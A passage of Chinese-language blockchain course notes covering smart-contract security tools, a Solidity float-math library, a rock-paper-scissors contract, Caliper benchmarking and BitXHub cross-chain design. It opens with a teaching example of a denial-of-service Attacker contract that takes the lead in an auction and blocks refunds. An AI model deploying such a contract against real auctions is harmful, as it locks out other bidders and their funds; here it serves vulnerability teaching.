          auction = Auction(_auctionaddr);
      }
      // a.Attacker合约获取合约的部署地址，并在Auction构造函数中对其进行初始化，以便攻击者可以访问Auction合约的功能。
      // b.该函数attack()调用合约函数Auction.bid()进行出价。
      function attack () payable public returns(address){
          auction.bid{value: msg.value}();
          return address(this); //Attacker的【合约地址】将成为新的最高出价者，不再改变  
      }
  
  
     // 若定义了回退函数 则攻击失败
     // fallback函数及其事件
     // event fallbackTrigged(bytes data);
     // fallback() external payable {emit fallbackTrigged(msg.data);}
  
  }
  ```

  漏洞发生：
  假设有用户开始出价。
  1.用户 1出价购买“3”以太币，因此将成为领跑者。
  2.用户 2出价购买“5”以太币，因此将接管领跑者的角色，用户1将获得退款。
  3.用户 3出价购买“6”以太币，因此将成为新的领跑者，用户2将获得退款。
  4.攻击者调用合约attack() 函数并出价，比如说，'7' 以太币。攻击者合约将成为新的领跑者，而用户3将被退还。
  5.现在，如果任何其他用户调用bid()函数，向攻击者合约的退款将失败。这是因为**Attacker合约没有实现接收以太币的fallback函数**。由于这个原因，任何Solidity以太传输函数，例如call(), send()或者transfer()都会导致异常或由于语句而导致意外恢复require()，从而停止执行。

  在这种情况下，攻击者合约将一直是无可争议的出价最高者，从而利用该系统。

#### Beosin VaaS

Beosin—VaaS作为一款针对智能合约的安全检测定制化工具，可精准定位风险代码位置并给出修改建议；可“一键式”自动检测出智能合约的10大项32小项常规安全漏洞，检测准确率>97%，全球最高，为智能合约代码提供“军事级”安全防护。同时，Beosin—VaaS的可定制化和可移植性一直以来都是该工具的核心亮点。Beosin—VaaS不但支持BCOS、ETH、EOS、Fabric、ONT等多个主流链平台，还支持适配使用EVM和WASM智能合约的公链和联盟链平台。并面向这些平台，针对性增加新的检测项。

Beosin-VaaS具有以下显著特点：

- 自动化程度高，“一键式”自动定位代码漏洞位置；
- 检测准确率>97%，全球最高；
- 从源码到字节码完备的形式化验证；
- 支持多个公链和联盟链平台；
- 支持多个智能合约编程语言，如Solidity、Go、C++、Python等。

另外，本次推出的离线免费版Beosin—VaaS，是继在线免费版Beosin—VaaS（网址：https://beosin.com/vaas/）之后，针对以太坊（Ethereum，简称ETH）智能合约安全检测开发的定制化工具，支持Windows、Linux和MACOS。以太坊应用开发者可通过VS Code插件市场免费获取和使用。

![image](https://user-images.githubusercontent.com/87604354/211181887-a87d44cc-5037-4e37-b786-fe443ae14aac.png)

[Beosin VaaS](https://vaas.beosin.com/#/home?token=Bearer null&lang=en_US)

![image](https://user-images.githubusercontent.com/87604354/211181903-167651dc-cf7e-4da2-9f22-635fcdb7f16d.png)



#### SCStudio

[FISCO-BCOS/SCStudio: Making Smart Contract Development More Secure and Easier (github.com)](https://github.com/FISCO-BCOS/SCStudio)

SCStudio 是一款针对 Solidity 合约的安全分析工具。在[Visual Studio Code](https://code.visualstudio.com/)（VS Code）开发环境下，开发者可通过 SCStudio 提供的 VS Code 扩展，在合约的开发过程中使用 SCStudio 进行实时安全性检查。SCStudio 由[清华大学软件系统安全保障小组](http://www.wingtecher.com/)开发并贡献。

Meng Ren, Fuchen Ma, Zijing Yin, Ying Fu, Huizhong Li, Wanli Chang, and Yu Jiang. 2021. Making smart contract development more secure and easier. In Proceedings of the 29th ACM Joint Meeting on European Software Engineering Conference and Symposium on the Foundations of Software Engineering (ESEC/FSE 2021). Association for Computing Machinery, New York, NY, USA, 1360–1370. https://doi.org/10.1145/3468264.3473929
![image](https://user-images.githubusercontent.com/87604354/211181909-8c32bdea-79df-47c1-9e74-a3552ee6f4d8.png)

![image](https://user-images.githubusercontent.com/87604354/211181937-e92e285a-037e-4bb1-bab9-0d52b479a53d.png)

![image](https://user-images.githubusercontent.com/87604354/211181916-ab8e57cd-15c5-452b-8944-fe99b52f8911.png)

![image](https://user-images.githubusercontent.com/87604354/211181921-7baaebae-6fe8-4953-9fe6-794ec130b265.png)


（1）安装 Visual Studio Code 插件

启动 Visual Studio Code 后，点击左侧侧边栏中“扩展”一项，在弹出扩展列表顶部的搜索框中键入“SCStudio”并搜索，在搜索结果中选择 SCStudio 进行安装。安装完毕后，遵循 Visual Studio Code 的提示重新载入窗口。

（2）配置

在 Visual Studio Code 的顶部菜单栏中依次点击`文件`、`首选项`、`设置`、`扩展`、`SCStudio`，可对 SCStudio 进行配置。当前 SCStudio 提供下列配置项：

- `Max Waiting Time`：在 SCStudio 对合约代码进行安全性检测时，会涉及网络交互、符号执行等较为耗时的过程。根据合约的复杂程度，检测过程可能会持续数秒至数分钟不等。为避免 SCStudio 陷入无尽等待，可以通过该配置项指定 SCStudio 的最大超时时间（以秒为单位）。该配置项默认设置为 60 秒。特别地，`Max Waiting Time`可配置为 0，此时启动检测过程后，SCStudio 将会持续等待，直至后端检测服务返回分析结果或网络出现异常；
- `Server Address`：此配置项用于配置后端检测服务的服务器地址，包括 IP 地址及其端口。当该配置项为空时，SCStudio 会将合约代码提交至用于试用服务器进行分析检测，此时需要有可用的外部网络连接。也可以按照[部署本地检测服务](https://github.com/FISCO-BCOS/SCStudio#二部署本地检测服务)一节中的说明，在本地搭建后端检测服务，并将`Server Address`配置为本地检测服务的地址。`Server Address`配置项的格式为`<IP地址>:<端口>`，例如“127.0.0.1:7898”。

当配置更新后，需要对配置文件进行保存以使配置项生效。

（3）使用

当在 Visual Studio Code 中新建或打开一个后缀名为“.sol”的文件后，SCStudio 插件将自动载入并初始化。当初始化完成后，VS Code 右下角的状态栏中将显示“SCStudio: Ready”字样：

此时 SCStudio 进入就绪（Ready）状态，你可以通过以下四种方式触发 SCStudio 对当前编辑窗口中的合约代码进行安全性检测：

- 命令：打开 VS Code 命令栏（Windows 及 Linux 下可通过 `Ctrl + Shift + P`快捷键、macOS 可通过 `Command + Shift + P`快捷键），并执行“SCStudio: Analyze Contract”或“SCStudio: Analyze Contract Without Compiling”命令即可开始对合约代码进行分析。两种命令的区别仅在于后者不会对合约代码进行自动编译。一般而言选择“SCStudio: Analyze Contract”可获得更多错误提示；
- 右键菜单：在编辑窗口中点击鼠标右键，在弹出的菜单中点击“Analyze Contract”或“Analyze Contract Without Compiling”，其效果分别等同于执行“SCStudio: Analyze Contract”或“SCStudio: Analyze Contract Without Compiling”命令；
- 状态栏：可以直接点击 VS Code 右下角状态栏中“SCStudio: Ready”字样，点击后 SCStudio 将开始执行“SCStudio: Analyze Contract”命令；
- 快捷键：`Ctrl` + `F10`（macOS 下为`Command` + `F10`）可执行“SCStudio: Analyze Contract”命令；`Ctrl` + `Shift` + `F1`（macOS 下为`Command` + `Shift` + `F10`）可执行“SCStudio: Analyze Contract Without Compiling”命令。

需要注意的是，当 SCStudio 开始对合约进行分析后，SCStudio 将由就绪状态转变为分析（Analyzing）状态，此时 VS Code 右下角状态栏中将显示“SCStudio: Analyzing”字样及对应动画，此时状态栏暂时无法点击、右键菜单中 SCStudio 相关菜单项暂时不可用，同时相关命令及快捷键也将暂时失效，直至分析过程结束、SCStudio 重新进入就绪状态。

当 SCStudio 检测到合约代码中存在安全性问题后，会通过彩带形式进行显式提示。当鼠标悬停于彩带上时，会显示错误详情、修复建议等信息。

除彩带提示外，当合约代码中存在安全性问题时，SCStudio 会以通知的形式询问是否需要将检测报告保存至本地：]

当选择“Yes”后，SCStudio 将打开文件浏览器，可在文件浏览器中选择报告的存放目录。选择完毕后，SCStudio 将在指定目录生成一份 HTML 格式的检测报告，报告文件的名称形如“VulnerabilitiesReport_{date}.html”，其中`{data}`为生成报告时的日期及时间。检测报告提供了界面更加友好的错误展示，你可以使用浏览器打开检测报告并进行浏览：

（4）部署本地检测服务

若`Server Address`配置项设置为空，则在合约代码检测的过程中，SCStudio 会将合约代码提交至试用服务器以进行检测。由于试用服务器的计算资源有限，此过程可能会较不稳定或耗时较长。同时，由于试用服务器运行于公网环境，因此可能会造成合约内容的外泄。若对用户体验或隐私性有较高要求，推荐在本地部署检测服务。

检测服务依赖于 Docker，因此部署服务前需要在本地预先[安装](https://www.docker.com/get-started)Docker，当前检测服务能够运行于 macOS 、 Linux 或安装有 WSL2 的 Windows 环境中，部署过程如下：

```shell
# 安装Mythril
docker pull mythril/myth
# 安装Oyente
docker pull qspprotocol/oyente-0.4.25
# 根据合约中要求的Solidity编译器版本安装Solidity编译器
# 此处以安装0.4.26版本的Solidity编译器为例
docker pull ethereum/solc:0.4.26
# 安装检测服务
docker pull fiscoorg/scstudio_backend:latest
# 运行检测服务
docker run -v /var/run/docker.sock:/var/run/docker.sock -v /tmp:/tmp -p 8001:7898 -it --rm fiscoorg/scstudio_backend:latest
cd backend/ && ./start_server.sh
```

容器内的检测服务固定监听**容器内的**7898 端口，可以在执行`docker run`命令时修改`-p`选项参数指定宿主与容器间的端口映射。在上述示例中，宿主的 8001 端口将会被映射至容器的 7898 端口，因此需要将`Server Address`配置项修改为“127.0.0.1:8001”，SCStudio 便能够正常访问本地的检测服务。

### 智能合约编写思路

（理清链上与链下&&确定数据结构）想想用户能抵赖什么

### FISCO BCOS智能合约库

避免重复造轮子

获取智能合约源代码方法

```shell
#通过github下载源码
curl -LO https://github.com/WeBankBlockchain/SmartDev-Contract/releases/download/V1.2.0-alpha/WeBankBlockchain-SmartDev-Contract.V1.2.0-alpha.zip
#下载成功后，手动或用命令行解压压缩包
unzip SmartDev-Contract*.zip
```

（1）LibSafeMathForFloatUtils

Solidity本不支持小数运算（浮点型），LibSafeMathForFloatUtils提供了浮点型的相关计算操作，且保证数据的正确性和安全性，包括加法、减法、乘法、除法等操作。

```solidity
pragma solidity^0.8.7;

library LibSafeMathForFloatUtils {
    /*
        fmul：浮点数乘法
        a：被乘数
        dA：被乘数a的精度，若a = 1234，dA=2，实际表示浮点型数为12.34 
        b：乘数
        dB：乘数的精度
        返回值：乘法后的结果，精度值(以被乘数精度为准)
        100.01 * 100.01 = 10000.0001 => 10000.00 
    */

    //精度默认为第二个乘数的精度
    function fmul(uint256 a, uint8 dA, uint256 b, uint8 dB) internal pure returns (uint256 c, uint8 decimals) {
        decimals = dA;
        c = a * b / (10 ** uint256(dB));
    }
    //@author:cuiyu
    //精度累加
    // function fmul(uint256 a, uint8 dA, uint256 b, uint8 dB) internal pure returns (uint256 c, uint8 decimals) {
    //     decimals = dA + dB;
    //     c = a.mul(b);
    // }

    /*
        fdiv：浮点数除法
        a：被除数
        dA：被除数a的精度，若a = 1234，decimalsA=2，实际表示浮点型数为12.34 
        b：除数
        dB：除数的精度
        返回值：除法后的结果，精度值(以被除数精度为准)
        10000.00 / 100.00 = 100.00
    */
    function fdiv(uint256 a, uint8 dA, uint256 b, uint8 dB) internal pure returns (uint256 c, uint8 decimals)  {
        decimals = dA;
        if(dA == dB) {
            c = a * (10 ** uint256(dA)) / (b);
        }
        else if(dA > dB) {
            //第一个参数精度更大
            b = b * (10 **uint256(dA - dB));
            c = a * (10 ** uint256(dA)) / (b);
        } else {
            //第2个参数精度更大
            b = b * (10 ** uint256(dB - dA));
            c = a * (10 ** uint256(dA)) / (b);
        }
    }
    
    /*
        fadd：浮点数加法
        a：加数a
        dA：加数a的精度，若a = 1234，decimalsA=2，实际表示浮点型数为12.34 
        b：加数b
        dB：加数b的精度
        返回值：加法后的结果，精度值(以第1个参数精度为准)
    */
    function fadd(uint256 a, uint8 dA, uint256 b, uint8 dB) internal pure returns (uint256 c, uint8 decimals)  {
        decimals = dA;
        if(dA == dB) {
            c = a + b;
        }
        else if(dA > dB) {
            //第一个参数精度更大
            b = b * (10 ** uint256(dA - dB));
            c = a + b;
        } else {
            //第2个参数精度更大
            b = b / (10 ** uint256(dB - dA));
            c = a + b;
        }
    }
    
    /*
        fsub：浮点数减法
        a：被减数
        dA：被减数a的精度，若a = 1234，decimalsA=2，实际表示浮点型数为12.34 
        b：减数
        dB：减数b的精度
        返回值：减法后的结果，精度值(以第1个参数精度为准)
    */
    function fsub(uint256 a, uint8 dA, uint256 b, uint8 dB) internal pure returns (uint256 c, uint8 decimals)  {
        decimals = dA;
        if(dA == dB) {
            c = a - b;
        } else if (dA > dB) {
            c = a - (b * (10 ** uint256(dA - dB)));
        } else {
            c = a - (b / (10 ** uint256(dB - dA)));
        }
        
    }
    
    
}

    
    
```

调用demo:

```solidity
pragma solidity^0.8.7;
import "./LibSafeMathForFloatUtils.sol";

contract testFloatLib {
    // dA代表a的精度，dB代表b的精度，返回值返回运算结果及其精度
    function mathTest(uint256 a, uint8 dA, uint256 b, uint8 dB, uint8 T) public pure returns(uint256, uint8) {
        if(T == 0) {
            // 加法测试
            return LibSafeMathForFloatUtils.fadd(a, dA, b, dB);
        } else if (T == 1) {
            // 减法
            return LibSafeMathForFloatUtils.fsub(a, dA, b, dB);
        } else if(T == 2) {
            // 乘法
            return LibSafeMathForFloatUtils.fmul(a, dA, b, dB);
        } else if(T == 3) {
            // 除法
            return LibSafeMathForFloatUtils.fdiv(a, dA, b, dB);
        }
    }
}
```

（2）LibAddress

LibAddress提供了address数据类型的基本操作，相关API列表如下。

课上演示

### 智能合约合约实例

（1）石头剪刀布游戏——#FISCO BCOS开源社区2022第1季Task挑战赛最佳项目贡献作品#

LibGameCompare.sol

```solidity
// SPDX-License-Identifier: UNLICENSED

// 定义library 计算获胜方
library LibGameCompare {
    // 玩家1 & 玩家2 
    // 返回值: 0 - 相等 ; 1 - 大于 ; 2 - 小于
    function max(uint8 a, uint8 b) internal pure returns (uint8) {
        require(a <= 2);
        require(b <= 2);
        if(a == b) {
            return 0;
        } else if(a > b) {
            // 1 ,0 ; 2,1; 2, 0
            return a - b;

        } else {
            if(b - a == 2) return 1;
            if(b - a == 1) return 2;
        }

        return 0;
    }
}
```

IDivergence.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity^0.6.10;

// 定义接口
interface IDivergence {
    // 注册
    function register(string memory _name) external;
    // 出手
    function punch(bytes32 _hash) external;
    // 证明
    function proofing(string memory _salt, uint8 _opt) external;
    // 查看获胜
    // 返回值： 1. 昵称 2. 玩家1出手 3. 玩家2出手 4. 轮次
    function winner() external view returns (string memory, string memory, string memory, uint256);
}

```

Divergence.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity^0.6.10;
import "./LibGameCompare.sol";
import "./IDivergence.sol";

// 玩家信息
struct Player {
    address addr;
    string  name;  
    uint8   opt;   // 出手选项 0 - 剪刀，1 - 石头，2 - 布
    bytes32 hash;  
    uint256 round; // 出手轮次
    uint8   status; // 状态：0 - 未出手；1 - 已经出手；2 - 已提交证明
}


// 合约实现
contract Divergence is IDivergence {

    // 控制玩家数量=2 
    uint8 userCount;
    // 记录玩家信息
    Player[2] playerlist;
    // 游戏是否结束
    bool isFinished; // 默认值 false
    // 记录胜利玩家
    uint8 winnerIndex;
    // 出手内容定义
    string[3]  gameOpts =  ["scissors", "rock", "paper"];

    // 出手event
    event Punch(address indexed addr, bytes32 hash);
    // 提出证明
    event Proof(address indexed addr, uint8 opt, string salt);
    // 胜出通知
    event WinnerBorn(address indexed winner, string name, uint8 opt, uint256 round);

    // 注册
    function register(string memory _name) override external {
        require(userCount < 2, "two player already go");
        playerlist[userCount].addr = msg.sender;
        playerlist[userCount].name = _name;
        userCount ++;
        if(userCount == 2) {
            require(playerlist[0].addr != playerlist[1].addr, "You can not play this game with yourself");
        }
    }
    // 出手 先出手不用关心对方出什么，后出手的需要判断对方是什么，决定游戏是否结束
    function punch(bytes32 _hash) override external {
        // 1. 玩家身份
        require(isPlayer(msg.sender), "only register player can do");
        // 2. 游戏没有结束 
        require(!isFinished, "game already finished");
        // 3. 两个玩家具备了再开始
        require(userCount == 2, "please wait a rival");
        
        (uint8 host, uint8 rival) = getIndex(msg.sender);

        Player storage player = playerlist[host];
        // 判断对方是否出手
        require(player.round <= playerlist[rival].round, "please wait");
        // 4. 玩家尚未出手 
        require(player.status == 0, "player already throw a punch");
        player.hash = _hash;
        player.round ++;
        player.status = 1;
        
        emit Punch(msg.sender, _hash);
        
    }
    // 证明
    function proofing(string memory _salt, uint8 _opt) override external {
        // 1. 游戏没有结束 
        require(!isFinished, "game already finished");
        bytes32 hash = keccak256(abi.encode(_salt, _opt));
        // 区分玩家1 和 玩家2 
        (uint8 host, uint8 rival) = getIndex(msg.sender);
        Player storage player = playerlist[host];
        require(player.round == playerlist[rival].round, "It may not safe to commit proof");
        require(player.status == 1, "user can not commit proof at current status");
        player.status = 2;
        if(_opt > 2 || hash != player.hash) {
            // 直接判负
            isFinished = true;
            winnerIndex = rival;
            // 触发事件
            emit WinnerBorn(playerlist[winnerIndex].addr, playerlist[winnerIndex].name, playerlist[winnerIndex].opt, playerlist[winnerIndex].round);
            return;
        }
        emit Proof(msg.sender, _opt, _salt);
        player.opt = _opt;
        if(player.status == 2 && playerlist[rival].status == 2) {
            // 处理胜负逻辑
            uint8 win = LibGameCompare.max(player.opt, playerlist[rival].opt);
            if(win == 1) {
                isFinished = true;
                winnerIndex = host;
            } else if(win == 2) {
                isFinished = true;
                winnerIndex = rival;
            } else {
                playerlist[rival].status = 0;
                player.status  = 0;
            }
            if(isFinished) {
                // 触发事件
                emit WinnerBorn(playerlist[winnerIndex].addr, playerlist[winnerIndex].name, playerlist[winnerIndex].opt, playerlist[winnerIndex].round);
            }
            
        }
        
    }
    // 查看获胜
    // 返回值： 1. 昵称 2. 玩家1出手 3. 玩家2出手 4. 轮次
    function winner() override external view returns (string memory, string memory, string memory, uint256) {
        if(!isFinished) {
            return ("none", "none", "none", 88888);
        }

        uint8 rival = 0; // 表示输的一方下标
        if(winnerIndex == 0) rival = 1;

        return (
            playerlist[winnerIndex].name, 
            gameOpts[playerlist[winnerIndex].opt],
            gameOpts[playerlist[rival].opt],
            playerlist[winnerIndex].round
        );
    }

    // 判断是否是注册玩家
    function isPlayer(address _addr) public view returns (bool) {
        if(_addr == playerlist[0].addr || _addr == playerlist[1].addr) return true;
        return false;
    }
    //yekai 123 2 0xe4c1209281b0ee06c09e03055af06926da954ba2697a9798e20ae11ed9bb531e
    //fuhongxue 123 1 0x5610d70754a691266ad97a972c2306bd75073fa9756a5cfeada56b6ab4aefd0e
    function helper(string memory _salt, uint8 _opt) public view returns (bytes32) {
        return keccak256(abi.encode(_salt, _opt));
    }
    
    // 区分本人和对手的序号
    function getIndex(address _addr) internal view returns (uint8, uint8) {
        // 区分玩家1 和 玩家2 
        uint8 host; // 代表本人
        uint8 rival; // 代表对方
        if(playerlist[0].addr == _addr) {
            host = 0;
            rival = 1;
        } else {
            host = 1;
            rival = 0;
        }
        
        return (host, rival);
    }
    
    // 重新开始游戏
    function reset() external {
        require(isFinished, "game is running");
        isFinished = false;
        playerlist[0].status = 0;
        playerlist[0].round  = 0;
        playerlist[1].status = 0;
        playerlist[1].round  = 0;
    }
}
```

### 智能合约设计模式概述



### 智能合约压力测试

Caliper是一个通用区块链性能测试工具。“Caliper”一词的原意就是标尺，Caliper旨在为区块链平台的测试提供一个公共的基准线。Caliper完全开源，因此用户不需要担心由于测试工具不开源导致无法对压测结果进行验证的问题。 同时，Hyperledger项目下设了性能及可扩展性工作组（PWSG），专门负责对各种性能指标（TPS、延迟、资源利用率等）进行形式化、规范化的定义，Caliper在设计也采用这一套性能指标体系并内嵌进了框架中。 Caliper能够方便地对接多种区块链平台并屏蔽了底层细节，用户只需要负责设计具体的测试流程，即可获取Caliper输出的可视化性能测试报告。可以看出，拥有这些特点的Caliper，能恰好满足FISCO BCOS对压测工具的需求。

![image](https://user-images.githubusercontent.com/87604354/211181956-3cdaa794-b5bf-4a4d-ac73-84ea3320ac46.png)

**（1）区块链适配API**

包含诸如在后端区块链上部署智能合约、调用合约、从账本查询状态等操作的接口，这些接口主要由区块链支配器提供。每个区块链适配器使用相应的区块链SDK或RESTful API来实现这些接口，Caliper也正是通过这些适配器提供的接口实现将区块链系统集成进Caliper框架中，目前除FISCO BCOS外，Caliper还支持Fabric、Iroha等区块链系统。

**（2）资源监控模块**

提供启动/停止监视器和获取后端区块链系统资源消耗状态的支持，资源监控的范围包括CPU、内存、网络IO等。目前Caliper提供两种监视器，一种是监视本地/远程docker容器，另一种则是监控本地进程。

**（3）性能分析模块**

提供读取预定义性能统计信息（包括TPS、延迟、成功交易数等）和打印基准测试结果等操作的支持。在调用区块链适配接口时，每个交易的关键指标（如创建交易的时间、交易提交时间、交易返回结果等）都会被记录下来，并用于生成最终的预定义性能指标统计信息。

**（4）报告生成模块**

主要负责对从性能分析模块获取到的性能数据进行美化加工，生成HTML格式测试报告。 Caliper的上层便是应用层，负责对区块链系统实施测试。每次测试都需要设置对应的测试配置文件以及定义后端区块链网络信息的测试参数。基于这些配置，Caliper便可以完成区块链系统的性能测试。 Caliper预置了一个默认的基准测试引擎以帮助测试人员快速理解框架并实施自己的测试，下一节将介绍如何使用基准测试引擎。当然，测试人员也可以不使用测试框架，直接使用区块链适配API完成自有区块链系统的测试。

部署与测试

**环境要求**

第一步. 配置基本环境

- 部署Caliper的计算机需要有外网权限；
- 操作系统版本需要满足以下要求：Ubuntu >= 16.04、CentOS >= 7或MacOS >= 10.14；
- 部署Caliper的计算机需要安装有以下软件：python 2.7、make、g++、gcc及git。

第二步. 安装NodeJS

- 版本要求：NodeJS 8 (LTS), 9, 或 10 (LTS)，Caliper尚未在更高的NodeJS版本中进行过验证。

部署Docker

```shell
# 添加源
sudo yum-config-manager --add-repo http://mirrors.aliyun.com/dockerce/linux/centos/docker-ce.repo
# 更新缓存
sudo yum makecache fast
# 安装社区版Docker
sudo yum -y install docker-ce
```

**Caliper部署**

第一步. 部署

Caliper提供了方便易用的命令行界面工具`caliper-cli`，推荐在本地进行局部安装：

建立一个工作目录

```shell
mkdir benchmarks && cd benchmarks
```

对NPM项目进行初始化

```shell
npm init
```

这一步主要是为在工作目录下创建package.json文件以方便后续依赖项的安装，如果不需要填写项目信息的话可以直接执行`npm` `init` `-y`。

安装`caliper-cli`

```shell
npm install --only=prod @hyperledger/caliper-cli@0.2.0
```

由于Caliper所有依赖项的安装较为耗时，因此使用`--only=prod`选项用于指定NPM只安装Caliper的核心组件，而不安装其他的依赖项（如各个区块链平台针对Caliper的适配器）。在部署完成后，可以通过`caliper-cli`显式绑定需要测试的区块链平台及相应的适配器。

验证caliper-cli安装成功

```shell
npx caliper --version
```

若安装成功，则会打印相应的版本信息

第二步. 绑定

由于Caliper采用了轻量级的部署方式，因此需要显式的绑定步骤指定要测试的平台及适配器版本，`caliper-cli`会自动进行相应依赖项的安装。使用`npx` `caliper` `bind`命令进行绑定，命令所需的各项参数可以通过如下命令查看：

```shell
user@ubuntu:~/benchmarks$ npx caliper bind --help
Usage:
  caliper bind --caliper-bind-sut fabric --caliper-bind-sdk 1.4.1 --caliper-bind-cwd ./ --caliper-bind-args="-g"

Options:
  --help               Show help  [boolean]
  -v, --version        Show version number  [boolean]
  --caliper-bind-sut   The name of the platform to bind to  [string]
  --caliper-bind-sdk   Version of the platform SDK to bind to  [string]
  --caliper-bind-cwd   The working directory for performing the SDK install  [string]
  --caliper-bind-args  Additional arguments to pass to "npm install". Use the "=" notation when setting this parameter  [string]
```

**–caliper-bind-sut** ：用于指定需要测试的区块链平台，即受测系统（***S***ystem ***u***nder ***T***est）； **–caliper-bind-sdk**：用于指定适配器版本； **–caliper-bind-cwd**：用于绑定`caliper-cli`的工作目录，`caliper-cli`在加载配置文件等场合时均是使用相对于工作目录的相对路径； **caliper-bind-args**：用于指定`caliper-cli`在安装依赖项时传递给`npm`的参数，如用于全局安装的`-g`。

对于FISCO BCOS，可以采用如下方式进行绑定：

```shell
npx caliper bind --caliper-bind-sut fisco-bcos --caliper-bind-sdk latest
```

第三步. 快速体验FISCO BCOS基准测试

为方便测试人员快速上手，FISCO BCOS已经为Caliper提供了一组预定义的测试样例，测试对象涵盖HelloWorld合约、Solidity版转账合约及预编译版转账合约。同时在测试样例中，Caliper测试脚本会使用docker在本地自动部署及运行4个互连的节点组成的链，因此测试人员无需手工搭链及编写测试用例便可直接运行这些测试样例。

**在工作目录下下载预定义测试用例**

```shell
git clone https://github.com/vita-dounai/caliper-benchmarks.git
```

**注意** 若出现网络问题导致的长时间拉取代码失败，则尝试以下方式:

```shell
# 拉取gitee代码
git clone https://gitee.com/vita-dounai/caliper-benchmarks.git
```

**执行HelloWorld合约测试**

```shell
sudo npx caliper benchmark run --caliper-workspace caliper-benchmarks --caliper-benchconfig benchmarks/samples/fisco-bcos/helloworld/config.yaml  --caliper-networkconfig networks/fisco-bcos/4nodes1group/fisco-bcos.json
```

![image](https://user-images.githubusercontent.com/87604354/211181961-b9721673-0ab3-48f8-9bf2-d1aee49ffb3c.png)

**执行Solidity版转账合约测试**

```shell
sudo npx caliper benchmark run --caliper-workspace caliper-benchmarks --caliper-benchconfig benchmarks/samples/fisco-bcos/transfer/solidity/config.yaml  --caliper-networkconfig networks/fisco-bcos/4nodes1group/fisco-bcos.json
```
![image](https://user-images.githubusercontent.com/87604354/211181967-c5a964a0-b846-4eb0-8f19-1eee4b3cab4a.png)

**执行预编译版转账合约测试**

```shell
sudo npx caliper benchmark run --caliper-workspace caliper-benchmarks --caliper-benchconfig benchmarks/samples/fisco-bcos/transfer/precompiled/config.yaml  --caliper-networkconfig networks/fisco-bcos/4nodes1group/fisco-bcos.json
```

![image](https://user-images.githubusercontent.com/87604354/211181970-b31641eb-8e25-4fad-a4a7-58d90d0e9188.png)

测试完成后，会在命令行界面中展示测试结果（TPS、延迟等）及资源消耗情况，同时会在`caliper-benchmarks`目录下生成一份包含上述内容的可视化HTML报告。

![image](https://user-images.githubusercontent.com/87604354/211181972-9ec6cec0-87dc-4b31-96f8-ebf854f336ad.png)

## FISCO BCOS区块链应用核心编程

### DAPP核心架构解析

课上总结

### FISCO BCOS Go-SDK解读

课上总结

### DAPP实例构建

课上总结

智能合约编写

SDK调用

GIN框架后端

前端搭载

## BitXHub跨链合约编程

### 跨链技术原理

单链体系——双链结构——多链架构——跨链技术

公证人机制、中继链\侧链、哈希时间锁合约

### 跨链智能合约

跨链智能合约是去中心化的应用，由多个部署在不同区块链网络的智能合约组成。这些智能合约之间可以实现互操作性，并共同构成一个完整的应用。这种创新的设计范式对多链生态的发展起到了关键的推动作用，并将有潜力利用不同区块链、侧链和layer 2网络的独特优势，打造出全新的智能合约用例。

多链生态虽然能为用户和开发者带来诸多好处，但将同一个智能合约的代码部署到多条区块链上还是会存在一系列特殊的挑战和利弊权衡。首先，多链智能合约的代码每部署到一个新的区块链上，都需要创建一份原应用的副本，这就意味着应用不再具有唯一性。相反，部署在每条链上的智能合约都管理着自己的内部状态（比如追踪账户余额），而不同区块链上的合约几乎或甚至完全不能直接交互。虽然用户可以访问任何一条链上的应用副本，但不同链上的用户体验不能保证完全一样。

安全的跨链通信（即：在各个链上环境之间传输任意数据、通证和指令）是实现跨链智能合约的关键要素。跨链智能合约是去中心化的应用，由多个部署在不同区块链网络的智能合约组成。这些智能合约之间可以互相通信，并共同构成一个完整的应用。

![image](https://user-images.githubusercontent.com/87604354/211181974-9556ee7c-74d3-4525-af93-3d1d5f7b5f4c.png)

尽管可以用各种方式实现这一部署，但在最底层需要设计跨链智能合约，让开发者可以将应用分割成不同的模块。也就是说，不同链上的智能合约可以分别执行不同的任务，而所有智能合约又都保持同步，并共同实现同一个应用场景。这样，开发者就可以利用不同区块链的优势，实现独特的价值。比如：去中心化的应用可以利用第一条区块链的抗操纵性来追踪资产所有权；利用第二条区块链的高吞吐量来实现低延时交易；利用第三条区块链的隐私性来识别用户身份；并利用第四条区块链的去中心化存储功能来储存元数据。

另外，这种跨链智能合约的设计范式还可以使部署在多个区块链上的同一智能合约副本之间更加流畅地交互。这将有助于统一多链应用在不同区块链上的用户体验。因此，跨链智能合约可以解决现有多链智能合约面临的诸多瓶颈，并打造出全新的应用场景。

### BitXHub

![image](https://user-images.githubusercontent.com/87604354/211181975-4295d857-7c7a-4b86-95be-0205276b34af.png)

BitXHub 致力于构建⼀个⾼可扩展、强鲁棒性、易升级的区块链跨链示范平台，为去中心化应⽤提供通信枢纽，⽀撑链上可信数据资产⾼效流动，服务区块链业务安全治理，为区块链互联⽹的形成提供可靠的底层技术支撑。BitXHub平台由中继链、应⽤链以及跨链网关三种⻆⾊组成， 并链原生集成W3C标准的DID 数字⾝份，依据场景导向可灵活组织部署架构，具有通⽤跨链传输协议、异构交易验证引擎、多层级路由三⼤核心功能特性，保证跨链交易的安全性、 灵活性与可靠性。

（1）链对链架构：在该种架构下，不同的链通过各自的跨链⽹关直接相连。对于跨链参与方有信任基础或者安全性要求不那么高的场景，采⽤链对链架构，可以大大降低跨链设施部署成本。

![image](https://user-images.githubusercontent.com/87604354/211181980-0e8ff34f-f130-4eb6-9013-2a6b3820664e.png)

（2）主从链架构：此架构下存在⼀条主链，主链能够通过跨链的方式控制和管 理从链上的部分功能和链上数据。该架构能够通过树状方式进⾏扩展，主链作为整个树的树根协调管理从链，比较合适的应⽤场景是存在权威中心或者希望通过多链提升业务性能。

![image](https://user-images.githubusercontent.com/87604354/211181985-c1507b02-94cd-45b5-b942-4b31620f891f.png)

（3）中继链架构：该架构下需要有中继链来验证应⽤链发出的跨链交易，各个应⽤链以平等的⾝份加入到中继链中。这种情况下更适合地位平等的组织或者机构组成的跨链联盟，各个组织共同维护中继链，并让自己拥有的应⽤链接入到跨链系统中来。中继链架构下还能通过多层中继链互联形成中继链网络的形式进⾏横向扩展。
![image](https://user-images.githubusercontent.com/87604354/211181988-b492918b-ac11-426c-b632-8464068a7642.png)



![image](https://user-images.githubusercontent.com/87604354/211181989-1870771d-2fe5-4a05-aa5c-c38a0d6af215.png)

